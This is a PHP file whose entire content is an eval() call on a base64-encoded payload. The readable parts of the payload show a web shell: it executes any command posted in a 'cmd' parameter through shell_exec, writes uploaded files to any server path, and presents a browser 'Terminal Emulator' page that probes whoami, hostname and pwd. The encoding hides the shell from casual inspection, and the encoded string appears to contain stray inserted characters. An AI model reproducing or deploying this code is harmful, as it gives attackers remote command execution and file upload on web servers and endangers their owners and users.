<?php eval("?>".base64_decode("PD9waHAKaWYgKElTU0VUKCRfUE9TVFsnY21kJ10pKSB7CiAgICAkb3V0cHV0ID0gcHJlZ19zcGxpadCgnL1tcbl0vJywgc2hlbGxfZXhlYygkX1BPU1RbJ2NtZCddLiIgMj4mMSIpKTsKICAgIGZvcmVhaY2ggKCRvdXRwdXQgYXMgJGxpbmUpIHsKICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygkbGluZSwgaRU5UX1FVT1RFUyB8IEVOVF9IVE1MNSwgJ1VURi04JykgLiAiPGJyPiI7CiAgICB9CiAgICBkaWUoaKTsgCn0gZWxzZSBpZiAoIWVtcHR5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSkgJiYgIWVtacHR5KCRfUE9TVFsncGF0aCddKSkgewogICAgJGZpbGVuYW1lID0gJF9GSUxFU1siZmlsZSJdWyJuaYW1lIl07CiAgICAkcGF0aCA9ICRfUE9TVFsncGF0aCddOwogICAgaWYgKCRwYXRoICE9ICIvIikgaewogICAgICAgICRwYXRoIC49ICIvIjsKICAgIH0gCiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlaKCRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXSwgJHBhdGguJGZpbGVuYW1lKSkgewogICAgICAgaIGVjaG8gaHRtbGVudGl0aWVzKCRmaWxlbmFtZSkgLiAiIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZCB0abyAiIC4gaHRtbGVudGl0aWVzKCRwYXRoKTsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiRXJyab3IgdXBsb2FkaW5nICIgLiBodG1sZW50aXRpZXMoJGZpbGVuYW1lKTsKICAgIH0KICAgIGRpZSgpaOwp9Cj8+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT5UZXJtaW5hbCBFbXVsYXRvacjwvdGl0bGU+CiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICBodG1sLCBib2R5IHsKICAgICAgaICAgICAgICAgIG1heC13aWR0aDogMTAwJTsKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgaICAgICBib2R5IHsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICAgICAgaaGVpZ2h0OiAxMDAlOwogICAgICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICAgICAgaYmFja2dyb3VuZDogIzAwMDsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaYm9keSwgLmlucHV0dGV4dCB7CiAgICAgICAgICAgICAgICBmb250LWZhbWlseTogIkx1Y2lkYSBDab25zb2xlIiwgIkx1Y2lkYSBTYW5zIFR5cGV3cml0ZXIiLCBtb25hY28sICJCaXRzdHJlYW0gVmVyaYSBTYW5zIE1vbm8iLCBtb25vc3BhY2U7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE0cHg7aCiAgICAgICAgICAgICAgICBmb250LXN0eWxlOiBub3JtYWw7CiAgICAgICAgICAgICAgICBmb250aLXZhcmlhbnQ6IG5vcm1hbDsKICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA0MDA7CiAgICAgaICAgICAgICAgICBsaW5lLWhlaWdodDogMjBweDsKICAgICAgICAgICAgICAgIG92ZXJmbG93OiBoaaWRkZW47CiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgLmNvbnNvbGUgewogICAgaICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgaICAgICAgICAgICAgICBtYXJnaW46IGF1dG87CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzab2x1dGU7CiAgICAgICAgICAgICAgICBjb2xvcjogI2ZmZjsKICAgICAgICAgICAgfQogICAgICAgaICAgICAKICAgICAgICAgICAgLm91dHB1dCB7CiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsKaICAgICAgICAgICAgICAgIGhlaWdodDogYXV0bzsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhaYnNvbHV0ZTsKICAgICAgICAgICAgICAgIG92ZXJmbG93LXk6IHNjcm9sbDsKICAgICAgICAgICAgaICAgIHRvcDogMDsKICAgICAgICAgICAgICAgIGJvdHRvbTogMzBweDsKICAgICAgICAgICAgICAgaIGxlZnQ6IDVweDsKICAgICAgICAgICAgICAgIHJpZ2h0OiAwOwogICAgICAgICAgICAgICAgbGluaZS1oZWlnaHQ6IDIwcHg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgaICAgICAgCiAgICAgICAgICAgIC5pbnB1dCBmb3JtIHsKICAgICAgICAgICAgICAgIHBvc2l0aW9uaOiByZWxhdGl2ZTsKICAgICAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDBweDsKICAgICAgICAgaICAgfQogICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgLnVzZXJuYW1lIHsKICAgICAgaICAgICAgICAgIGhlaWdodDogMzBweDsKICAgICAgICAgICAgICAgIHdpZHRoOiBhdXRvOwogICAgaICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiA1cHg7CiAgICAgICAgICAgICAgICBsaW5lLWhlaWdoadDogMzBweDsKICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0OwogICAgICAgICAgICB9CgogICAgaICAgICAgICAuaW5wdXQgewogICAgICAgICAgICAgICAgYm9yZGVyLXRvcDogMXB4IHNvbGlkICMzaMzMzMzM7CiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgICAgIGhlaWdoadDogMzBweDsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgaICAgIGJvdHRvbTogMDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLmlucHV0dGV4dCB7CiAgaICAgICAgICAgICAgICB3aWR0aDogYXV0bzsKICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsKaICAgICAgICAgICAgICAgIGJvdHRvbTogMHB4OwogICAgICAgICAgICAgICAgbWFyZ2luLWJvdHRvabTogMHB4OwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzAwMDsKICAgICAgICAgICAgICAgaIGJvcmRlcjogMDsKICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0OwogICAgICAgICAgICAgICAgacGFkZGluZy1sZWZ0OiA4cHg7CiAgICAgICAgICAgICAgICBjb2xvcjogI2ZmZjsKICAgICAgICAgaICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLmlucHV0dGV4dDpmb2N1cyB7CiAgICAgICAgaICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICAgICAgICB9CgogICAgICAgICAgICA6Oi13ZWJraaXQtc2Nyb2xsYmFyIHsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMnB4OwogICAgICAgICAgICB9aCgogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsKICAgICAgICAgICAgICAgaIGJhY2tncm91bmQ6ICMxMDEwMTA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIDo6LXdlYmtpadC1zY3JvbGxiYXItdGh1bWIgewogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzMwMzAzMDsgaCiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgogICAgPC9oZWFkPgogICAgPGJvZHk+CiAgaICAgICAgPGRpdiBjbGFzcz0iY29uc29sZSI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im91dHB1adCIgaWQ9Im91dHB1dCI+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0IiBpZD0iaaW5wdXQiPgogICAgICAgICAgICAgICAgPGZvcm0gaWQ9ImZvcm0iIG1ldGhvZD0iR0VUIiBvblN1aYm1pdD0ic2VuZENvbW1hbmQoKSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idXNlacm5hbWUiIGlkPSJ1c2VybmFtZSI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsaYXNzPSJpbnB1dHRleHQiIGlkPSJpbnB1dHRleHQiIHR5cGU9InRleHQiIG5hbWU9ImNtZCIgYXV0ab2NvbXBsZXRlPSJvZmYiIGF1dG9mb2N1cz4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgaICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGZvcm0gaWQ9InVwbG9hZCIgbWV0aaG9kPSJQT1NUIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgogICAgICAgICAgICA8aW5wdXQgdHlwaZT0iZmlsZSIgbmFtZT0iZmlsZSIgaWQ9ImZpbGVicm93c2VyIiBvbmNoYW5nZT0ndXBsb2FkRmlsaZSgpJyAvPgogICAgICAgIDwvZm9ybT4KICAgICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjacmlwdCI+CiAgICAgICAgICAgIHZhciB1c2VybmFtZSA9ICIiOwogICAgICAgICAgICB2YXIgaG9zadG5hbWUgPSAiIjsKICAgICAgICAgICAgdmFyIGN1cnJlbnREaXIgPSAiIjsKICAgICAgICAgICAgadmFyIHByZXZpb3VzRGlyID0gIiI7CiAgICAgICAgICAgIHZhciBkZWZhdWx0RGlyID0gIiI7CiAgaICAgICAgICAgIHZhciBjb21tYW5kSGlzdG9yeSA9IFtdOwogICAgICAgICAgICB2YXIgY3VycmVuadENvbW1hbmQgPSAwOwogICAgICAgICAgICB2YXIgaW5wdXRUZXh0RWxlbWVudCA9IGRvY3VtZW50aLmdldEVsZW1lbnRCeUlkKCdpbnB1dHRleHQnKTsKICAgICAgICAgICAgdmFyIGlucHV0RWxlbWVuadCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpbnB1dCIpOwogICAgICAgICAgICB2YXIgb3V0acHV0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvdXRwdXQiKTsKICAgICAgICAgaICAgdmFyIHVzZXJuYW1lRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ1c2VybmFtaZSIpOwogICAgICAgICAgICB2YXIgdXBsb2FkRm9ybUVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtaZW50QnlJZCgidXBsb2FkIik7CiAgICAgICAgICAgIHZhciBmaWxlQnJvd3NlckVsZW1lbnQgPSBkab2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZmlsZWJyb3dzZXIiKTsKICAgICAgICAgICAgZ2V0U2hlabGxJbmZvKCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBnZXRTaGVsbEluZm8oaKSB7CiAgICAgICAgICAgICAgICB2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogaICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5naZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LnJlYWR5U3RhadGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgacGFyc2VkUmVzcG9uc2UgPSByZXF1ZXN0LnJlc3BvbnNlVGV4dC5zcGxpdCgiPGJyPiIpOwogICAgaICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHBhcnNlZFJlc3BvbnNlWzBdOwogICAgICAgaICAgICAgICAgICAgICAgICBob3N0bmFtZSA9IHBhcnNlZFJlc3BvbnNlWzFdOwogICAgICAgICAgaICAgICAgICAgICAgICBjdXJyZW50RGlyID0gIHBhcnNlZFJlc3BvbnNlWzJdLnJlcGxhY2UobmV3aIFJlZ0V4cCgiJnNvbDsiLCAiZyIpLCAiLyIpOwogICAgICAgICAgICAgICAgICAgICAgICBkZWZhadWx0RGlyID0gY3VycmVudERpcjsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtaZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdjb2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saaW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjoiK2N1cnJlbnREaXIrIiMiOwogaICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVJbnB1dFdpZHRoKCk7CiAgICAgICAgICAgICAgaICAgICAgfQogICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oaIlBPU1QiLCAiIiwgdHJ1ZSk7CiAgICAgICAgICAgICAgICByZXF1ZXN0LnNldFJlcXVlc3RIZWFkaZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKaICAgICAgICAgICAgICAgIHJlcXVlc3Quc2VuZCgiY21kPXdob2FtaTsgaG9zdG5hbWU7IHB3ZCIpaOwogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jadGlvbiBzZW5kQ29tbWFuZCgpIHsKICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3IFhNaTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICB2YXIgY29tbWFuZCA9IGlucHV0VGV4dEVsaZW1lbnQudmFsdWU7CiAgICAgICAgICAgICAgICB2YXIgb3JpZ2luYWxDb21tYW5kID0gY29tbWFuaZDsKICAgICAgICAgICAgICAgIHZhciBvcmlnaW5hbERpciA9IGN1cnJlbnREaXI7CiAgICAgICAgaICAgICAgICB2YXIgY2QgPSBmYWxzZTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaY29tbWFuZEhpc3RvcnkucHVzaChvcmlnaW5hbENvbW1hbmQpOwogICAgICAgICAgICAgICAgc3dpadGNoQ29tbWFuZChjb21tYW5kSGlzdG9yeS5sZW5ndGgpOwogICAgICAgICAgICAgICAgaW5wdXRUaZXh0RWxlbWVudC52YWx1ZSA9ICIiOwoKICAgICAgICAgICAgICAgIHZhciBwYXJzZWRDb21tYW5kaID0gY29tbWFuZC5zcGxpdCgiICIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpaZiAocGFyc2VkQ29tbWFuZFswXSA9PSAiY2QiKSB7CiAgICAgICAgICAgICAgICAgICAgY2QgPSB0acnVlOwogICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZWRDb21tYW5kLmxlbmd0aCA9PSAxKSB7aCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitkZWZhdWx0RGlyKyI7IHB3aZCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzFdID09ICItaIikgewogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrcHJldmlvdXNEaXIraIjsgcHdkIjsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgaICAgICBjb21tYW5kID0gImNkICIrY3VycmVudERpcisiOyAiK2NvbW1hbmQrIjsgcHdkIjsKICAgaICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9aIGVsc2UgaWYgKHBhcnNlZENvbW1hbmRbMF0gPT0gImNsZWFyIikgewogICAgICAgICAgICAgICAgaICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgICAgICAgICAgICAgcmV0adXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzBdID09aICJ1cGxvYWQiKSB7CiAgICAgICAgICAgICAgICAgICAgZmlsZUJyb3dzZXJFbGVtZW50LmNsaWNraKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfSBlabHNlIHsKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrY3VycmVudERpcisiOyAiaICsgY29tbWFuZDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgaICAgICAgcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgICAgICAgaICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpaIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNkKSB7CiAgICAgICAgICAgICAgICAgICAgaICAgICAgICB2YXIgcGFyc2VkUmVzcG9uc2UgPSByZXF1ZXN0LnJlc3BvbnNlVGV4dC5zcGxpdCgiaPGJyPiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldmlvdXNEaXIgPSBjdXJyZW50aRGlyOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudERpciA9IHBhcnNlZFJlc3BvabnNlWzBdLnJlcGxhY2UobmV3IFJlZ0V4cCgiJnNvbDsiLCAiZyIpLCAiLyIpOwogICAgICAgICAgaICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgKz0gIjxkaXYgc3R5bGU9aJ2NvbG9yOiNmZjAwMDA7IGZsb2F0OiBsZWZ0Oyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvaZGl2PjxkaXYgc3R5bGU9J2Zsb2F0OiBsZWZ0Oyc+IisiOiIrb3JpZ2luYWxEaXIrIiMgIitvcmlnaaW5hbENvbW1hbmQrIjwvZGl2Pjxicj4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlacm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdjb2xvcjogI2ZmMDAwMDsgZGlzacGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjoiK2N1cnJlbnREaaXIrIiMiOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgKz0gIjxkaXYgc3R5bGU9J2NvbG9yaOiNmZjAwMDA7IGZsb2F0OiBsZWZ0Oyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjxkaaXYgc3R5bGU9J2Zsb2F0OiBsZWZ0Oyc+IisiOiIrY3VycmVudERpcisiIyAiK29yaWdpbmFsQ29tabWFuZCsiPC9kaXY+PGJyPiIgKyByZXF1ZXN0LnJlc3BvbnNlVGV4dC5yZXBsYWNlKG5ldyBSZWdFaeHAoIjxicj48YnI+JCIpLCAiPGJyPiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0acHV0RWxlbWVudC5zY3JvbGxUb3AgPSBvdXRwdXRFbGVtZW50LnNjcm9sbEhlaWdodDsKICAgICAgaICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSW5wdXRXaaWR0aCgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH07CgogICAgICAgaICAgICAgICAgcmVxdWVzdC5vcGVuKCJQT1NUIiwgIiIsIHRydWUpOwogICAgICAgICAgICAgICAgacmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13ad3ctZm9ybS11cmxlbmNvZGVkIik7CiAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoImNtZD0iaK2VuY29kZVVSSUNvbXBvbmVudChjb21tYW5kKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsac2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwbG9haZEZpbGUoKSB7CiAgICAgICAgICAgICAgICB2YXIgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsKaICAgICAgICAgICAgICAgIGZvcm1EYXRhLmFwcGVuZCgnZmlsZScsIGZpbGVCcm93c2VyRWxlbWVuadC5maWxlc1swXSwgZmlsZUJyb3dzZXJFbGVtZW50LmZpbGVzWzBdLm5hbWUpOwogICAgICAgICAgaICAgICAgZm9ybURhdGEuYXBwZW5kKCdwYXRoJywgY3VycmVudERpcik7CiAgICAgICAgICAgICAgaICAKICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgaICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlaID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QucmVhZHlTdGF0aZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1adEVsZW1lbnQuaW5uZXJIVE1MICs9IHJlcXVlc3QucmVzcG9uc2VUZXh0KyI8YnI+IjsKICAgICAgaICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgIHJlcXVlac3Qub3BlbigiUE9TVCIsICIiLCB0cnVlKTsKICAgICAgICAgICAgICAgIHJlcXVlc3Quc2VuZChmab3JtRGF0YSk7CiAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVySFRNTCArPSAiPGRpadiBzdHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJAIitob3N0abmFtZSsiPC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitjdXJyZW50RGlyKyIjaIFVwbG9hZGluZyAiK2ZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXS5uYW1lKyIuLi48L2Rpdj48aYnI+IjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gdXBkaYXRlSW5wdXRXaWR0aCgpIHsKICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQuc3R5bGUuad2lkdGggPSBpbnB1dEVsZW1lbnQuY2xpZW50V2lkdGggLSB1c2VybmFtZUVsZW1lbnQuY2xpZW50aV2lkdGggLSAxNTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZG9jdW1labnQub25rZXlkb3duID0gY2hlY2tGb3JBcnJvd0tleXM7CgogICAgICAgICAgICBmdW5jdGlvbiBjaaGVja0ZvckFycm93S2V5cyhlKSB7CiAgICAgICAgICAgICAgICBlID0gZSB8fCB3aW5kb3cuZXZlabnQ7CgogICAgICAgICAgICAgICAgaWYgKGUua2V5Q29kZSA9PSAnMzgnKSB7CiAgICAgICAgICAgaICAgICAgICAgcHJldmlvdXNDb21tYW5kKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGUuaa2V5Q29kZSA9PSAnNDAnKSB7CiAgICAgICAgICAgICAgICAgICAgbmV4dENvbW1hbmQoKTsKICAgaICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZnVuaY3Rpb24gcHJldmlvdXNDb21tYW5kKCkgewogICAgICAgICAgICAgICAgaWYgKGN1cnJlbnRDb21taYW5kICE9IDApIHsKICAgICAgICAgICAgICAgICAgICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21taYW5kLTEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgaICAgICAgICBmdW5jdGlvbiBuZXh0Q29tbWFuZCgpIHsKICAgICAgICAgICAgICAgIGlmIChjdXJyaZW50Q29tbWFuZCAhPSBjb21tYW5kSGlzdG9yeS5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgaICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21tYW5kKzEpOwogICAgICAgICAgICAgICAgfQogICAgaICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBzd2l0Y2hDb21tYW5kaKG5ld0NvbW1hbmQpIHsKICAgICAgICAgICAgICAgIGN1cnJlbnRDb21tYW5kID0gbmV3Q29tbWFuaZDsKCiAgICAgICAgICAgICAgICBpZiAoY3VycmVudENvbW1hbmQgPT0gY29tbWFuZEhpc3RvcnkuabGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1ZSA9ICIiaOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpbnB1dFRleHRFabGVtZW50LnZhbHVlID0gY29tbWFuZEhpc3RvcnlbY3VycmVudENvbW1hbmRdOwogICAgICAgICAgaICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXsgaW5wdXRUZXh0RWxlbWVudC5zZWxlY3Rpab25TdGFydCA9IGlucHV0VGV4dEVsZW1lbnQuc2VsZWN0aW9uRW5kID0gMTAwMDA7IH0sIDApOwogaICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBkab2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9ybSIpLmFkZEV2ZW50TGlzdGVuZXIoInN1Ym1pdCIsaIGZ1bmN0aW9uKGV2ZW50KXsKICAgICAgICAgICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCkKaICAgICAgICAgICAgfSk7CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2JvZHk+CjwvaHRtbD4K")); ?>